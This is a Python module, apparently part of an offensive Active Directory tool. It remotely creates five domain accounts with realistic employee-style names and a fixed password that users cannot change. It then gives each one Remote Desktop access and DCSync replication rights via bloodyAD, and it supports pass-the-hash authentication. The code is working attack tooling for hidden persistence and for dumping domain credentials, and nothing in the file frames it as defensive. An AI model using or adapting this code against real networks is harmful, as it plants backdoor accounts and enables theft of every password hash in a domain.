from colored import Fore
import random
from .miscellaneous import *
from ..Modules.run_modules import execute_powershell, run_command

USERS = [
    "jSmith", "mJohnson", "rWilliams", "dBrown", "aGrant",
    "tGarcia", "bMiller", "cDavis", "aWilson", "kAnderson",
    "eTaylor", "nThomas", "wJackson", "lWhite", "pHarris",
    "hMartin", "gThompson", "fYoung", "vAllen", "oKing",
    "jWright", "mScott", "rGreen", "dBaker", "sAdams",
    "tNelson", "bCarter", "cMitchell", "aRoberts", "kTurner",
    "ePhillips", "nCampbell", "wParker", "lEvans", "pEdwards",
    "hCollins", "gStewart", "fMorris", "vRogers", "oReed",
    "jCook", "mMorgan", "rBell", "dMurphy", "sBailey",
    "tRivera", "bCooper", "cRichardson", "aCox", "kHoward"
]

def generate_users(count: int =5) -> list:
    return USERS[:count]


def grant_dcsync(target: str, username: str, password: str, domain: str, new_user: str, use_hash: bool = False) -> None:
    if use_hash:
        cmd = ['bloodyAD', '-u', username, '-H', password, '-d', domain, '--host', target, 'add', 'dcsync', new_user]
    else:
        cmd = ['bloodyAD', '-u', username, '-p', password, '-d', domain, '--host', target,'add', 'dcsync', new_user]

    try:
        result = run_command(cmd, False, False)
        output = result.stdout + result.stderr
        print(f"{Fore.GREEN}    [+] DCSync rights granted: {new_user}")
    except Exception as e:
        print(f"{Fore.RED}      [-] DCSync exception for {new_user}: {str(e)}")

def grant_rdp(target: str, username: str, password: str, domain: str, new_user: str, use_hash: bool = False) -> None:
    rdp_cmd = f'net localgroup "Remote Desktop Users" {domain}\\{new_user} /add'
    success, output = execute_powershell(target, username, password, domain, rdp_cmd, use_hash)
    if success:
        print(f"{Fore.GREEN}    [+] RDP rights granted: {new_user}")
    else:
        print(f"{Fore.RED}    [-] RDP grant failed for {new_user}: {output}")

def user_party(target: str, username: str, password: str, new_password: str, domain: str, use_hash: bool = False) -> None:
    users = generate_users()
    count = 0

    for user in users:
        create_cmd = (
            f'net user {user} "{new_password}" /add /domain '
            f'/fullname:"{user}" /passwordchg:no'
        )

        success, output = execute_powershell(target, username, password, domain, create_cmd, use_hash)

        if success:
            print(f"{Fore.GREEN}[+] Created: {user}")
            grant_rdp(target, username, password, domain, user, use_hash)
            grant_dcsync(target, username, password, domain, user, use_hash)
            count += 1
        else:
            print(f"{Fore.RED}[-] Failed to create {user}: {output}")
    



    
